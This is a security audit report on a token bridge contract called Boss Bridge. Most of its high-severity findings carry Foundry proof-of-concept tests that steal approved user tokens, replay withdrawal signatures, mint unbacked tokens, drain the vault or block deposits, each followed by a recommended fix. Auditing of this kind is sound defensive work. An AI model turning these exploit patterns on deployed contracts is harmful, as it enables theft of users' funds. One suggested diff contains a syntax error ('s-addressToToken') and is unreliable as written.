# Protocol Summary

## Boss Bridge

This project presents a simple bridge mechanism to move our ERC20 token from L1 to an L2 we're building.
The L2 part of the bridge is still under construction, so we don't include it here.

In a nutshell, the bridge allows users to deposit tokens, which are held into a secure vault on L1. Successful deposits trigger an event that our off-chain mechanism picks up, parses it and mints the corresponding tokens on L2.

To ensure user safety, this first version of the bridge has a few security mechanisms in place:

- The owner of the bridge can pause operations in emergency situations.
- Because deposits are permissionless, there's an strict limit of tokens that can be deposited.
- Withdrawals must be approved by a bridge operator.

We plan on launching `L1BossBridge` on both Ethereum Mainnet and ZKSync. 

## Token Compatibility

For the moment, assume *only* the `L1Token.sol` or copies of it will be used as tokens for the bridge. This means all other ERC20s and their [weirdness](https://github.com/d-xo/weird-erc20) is considered out-of-scope. 

## On withdrawals

The bridge operator is in charge of signing withdrawal requests submitted by users. These will be submitted on the L2 component of the bridge, not included here. Our service will validate the payloads submitted by users, checking that the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge.

## Actors/Roles

- Bridge Owner: A centralized bridge owner who can:
  - pause/unpause the bridge in the event of an emergency
  - set `Signers` (see below)
- Signer: Users who can "send" a token from L2 -> L1. 
- Vault: The contract owned by the bridge that holds the tokens. 
- Users: Users mainly only call `depositTokensToL2`, when they want to send tokens from L1 -> L2. 



# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 7                      |
| Medium   | 0                      |
| Low      | 2                      |
| Info     | 0                      |
| Gas      | 0                      |
| Total    | 9                      |

# Findings

## High 

### [H-1] Users who grant token approvals to L1BossBridge risk having their assets stolen.

**Description:** The `L1BossBridge::depositTokensToL2` function allows anyone to call it with a `from` address of any account that has approved tokens to the bridge.

**Impact:** As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the `l2Recipient` parameter).

**Proof of Concept:** Include the following test in the `L1BossBridge.t.sol` file:
<summary>PoC</summary>
<details>

```javascript
 function testCanMoveApprovedTokensOfOtherUsers() public{
        vm.startPrank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        uint256 depositAmount = token.balanceOf(user);
        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));  
        emit Deposit(user, attacker, depositAmount);
        tokenBridge.depositTokensToL2(user, attacker, depositAmount);

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), depositAmount);
        vm.stopPrank();
    }
```
</details>

**Recommended Mitigation:** Consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```


### [H-2] The lack of replay protection in `L1BossBridge::withdrawTokensToL1` allows withdrawals by signature to be replayed

**Description:** Users who want to withdraw tokens from the bridge can call the `sendToL1` function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.The signatures do not include any kind of replay-protection mechanisn.

**Impact:** Valid signatures from any  bridge operator can be reused by the  attacker to continue executing withdrawals until the vault is completely drained.

**Proof of Concept:**
Include the following test in the `L1TokenBridge.t.sol` file:
<summary>PoC</summary>
<details>

```javascript
function testCanReplayWithdrawals() public {
    // Assume the vault already holds some tokens
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), address(attacker), attackerInitialBalance);

    // An attacker deposits tokens to L2
    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);

    // Operator signs withdrawal.
    (uint8 v, bytes32 r, bytes32 s) =
        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);

    // The attacker can reuse the signature and drain the vault.
    while (token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
    }
    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
    assertEq(token.balanceOf(address(vault)), 0);
}
```
</details>


**Recommended Mitigation:** Consider redesigning the withdrawal mechanism with replay protection such as nonce.

### [H-3] Calling `L1BossBridge::depositTokensToL2` from the Vault contract to the Vault contract enables infinite minting of unbacked tokens.

**Description:** `L1BossBridge::depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken. Because the vault grants infinite approval to the bridge.

**Impact:** It's possible for an attacker to call the `L1BossBridge::depositTokensToL2` function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, causing the minting of unbacked tokens in L2. Moreover, they could mint all the tokens to themselves. 

**Proof of Concept:**
Include the following test in the `L1TokenBridge.t.sol` file:

<summary>PoC</summary>
<details>

```javascript
    function testCanTransferFromVaultToVault() public{
        address attacker = makeAddr("attacker");
        uint256 vaultBalance = 500 ether;
        deal(address(token), address(vault), vaultBalance);
        // console2.log("vault balance in token:", token.balanceOf(address(vault));

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);


    }
```
</details>

**Recommended Mitigation:** Consider modifying the `L1BossBridge::depositTokensToL2` function so that the caller cannot specify a `from` address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```




### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo`, giving themselves infinite allowance of vault funds.


**Description:** The `L1BossBridge` contract includes the `sendToL1`function, which can be called with a valid signature by an operator to execute arbitrary low-level calls to any given target. Since there are no restrictions on the target or the calldata, this call can be exploited by an attacker to execute sensitive contracts associated with the bridge, such as the `L1Vault` contract.The `L1BossBridge` contract owns the `L1Vault` contract.  

**Impact:** Consequently, an attacker could submit a call targeting the vault to execute its `approveTo` function, passing an attacker-controlled address to increase its allowance. This would enable the attacker to completely drain the vault.

**Proof of Concept:**
Include the following test in the `L1BossBridge.t.sol` file:

<summary>PoC</summary>
<details>


```javascript
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    bytes memory message = abi.encode(
        address(vault), 
        0, 
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max))
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

</details>

Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.



### [H-5] Malicious user can DoS attack on `L1BossBridge::depositTokensToL2` 

**Description:**  The `L1BossBridge::depositTokensToL2` has a deposit limit that limits the amount of funds a user can deposit into the bridge. A malicious user makes a donation to the contract inorder to make the deposit limit reached.

```javascript
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
```

**Impact:** Consequently, user will not be able to deposit tokens on L2.

**Proof of Concept:**
Include the following test suite in the `L1TokenBridge.t.sol`.

<summary>PoC</summary>
<details>

```javascript
    function testDoSAttack() public{
        address attacker = makeAddr("attacker");
        uint256 attackerAmount = 20;

        deal(address(token), attacker, attackerAmount);
        vm.startPrank(attacker); //attacker performing DoS attack
        token.transfer(address(vault), 20);
        vm.stopPrank();

        vm.startPrank(user);
        uint256 userAmount = tokenBridge.DEPOSIT_LIMIT() -1;
        deal(address(token), user, userAmount);
        token.approve(address(tokenBridge), userAmount);

        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
        tokenBridge.depositTokensToL2(user, userInL2, userAmount);

    }
```
</details>


**Recommended Mitigation:** Consider using the internal mapping to check for the deposit limit instead of balanceOf().



### [H-6] Lack of validation in `L1BossBridge::withdrawTokensToL1` allows malicious user to withdraw more funds than they deposited.

**Description:** The `L1BoosBridge::withdrawTokensToL1` function has no validation on the withdrawl amount being the samw as the deposited amount.

**Impact:** Consequently, this will lead to a malicious user can deposit small amount of tokens and drain the entire vault.

**Proof of Concept:**
<summary>PoC</summary>
<details>

```javascript
    function testUserCanWithdrawMoreTokensThanDeposited() public{
        uint256 userDepositedAmount = 100e18;
        deal(address(token), user, userDepositedAmount);

        vm.startPrank(user);
        token.approve(address(tokenBridge), userDepositedAmount);
        tokenBridge.depositTokensToL2(user, userInL2, userDepositedAmount);
        vm.stopPrank();

        address attacker = makeAddr("attacker");
        uint256 attackerDepositedAmount = 30;
        deal(address(token), attacker, attackerDepositedAmount);

        vm.startPrank(attacker);
        token.approve(address(tokenBridge), attackerDepositedAmount);
        tokenBridge.depositTokensToL2(attacker, userInL2, attackerDepositedAmount);
        vm.stopPrank();

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(attacker, 
                                            userDepositedAmount + attackerDepositedAmount), operator.key);

        vm.startPrank(attacker);
        tokenBridge.withdrawTokensToL1(attacker, userDepositedAmount + attackerDepositedAmount, v,r,s);
        vm.stopPrank();

        uint256 attackerEndingBalance = token.balanceOf(address(attacker));
        assertEq(attackerEndingBalance, userDepositedAmount + attackerDepositedAmount);
    }
```

</details>

**Recommended Mitigation:** Create a internal mapping for the tracking of deposits of every individual user in the `L1BossBridge::depositTokensToL2` and use that mapping for check in the `L1BossBridge::withdrawTokensToL1`.



### [H-7] `TokenFactory::deployToken` locks tokens permanently

**Description:** The `TokenFactory::deployToken` is responsible for deploying tokens, however `L1Token` mints the initial supply to the `msg.sender`. In this case `msg.sender` is `TokenFactory` and the  `TokenFactory` does not contain any functions for withdraw of tokens or to mint new tokens.

**Impact:** Using the  current `TokenFactory` mechanism to deploy tokens leads to result in unusable tokens.

**Recommended Mitigation:** Consider passing  the receiver address in the constructor of `L1Token`.
```diff
-    constructor() ERC20("BossBridgeToken", "BBT") {
+    constructor(address receiver) ERC20("BossBridgeToken", "BBT") {
-         _mint(msg.sender, INITIAL_SUPPLY * 10 ** decimals());
+         _mint(receiver, INITIAL_SUPPLY * 10 ** decimals());
    }
```


## Low

### [L-1] Lack of event emission during withdrawals and sending tokens to L1

**Description:** Neither the `sendToL1` function nor the `withdrawTokensToL1` function emit an event when a withdrawal operation is successfully executed.

**Impact:** This leads to prevention of off-chain mechanisms to monitor withdrawls and raise alerts on suspicious scenarios.

**Recommended Mitigation:** Modify the `sendToL1` function to include a new event that is always emitted upon completing withdrawls.


### [L-2] `TokenFactory::deployToken` can create multiple tokens with same symbol.

**Description:** The `TokenFactory::deployToken` can deploy tokens with the same symbol and the `s_tokenToAddress` mapping is designed to store the different token symbols corresponding to their address. However, due to storing same token symbols for different addresses, the retrieval of data results in unpredictable behaviour and potential for errors.

**Impact:** If two or more tokens deployed through the `TokenFactory`, it leads to errors while storing different tokens.

**Recommended Mitigation:** Consider redesigning the mapping `s_tokenToAddress` in `TokenFactory`.
```diff
-  mapping(string tokenSymbol => address tokenAddress) private s_tokenToAddress;
+  mapping(address tokenAddress => string tokenSymbol) private s_addressToToken;
.
.
.
- s_tokenToAddress[symbol] = addr;
+ s-addressToToken[addr] = symbol;

```




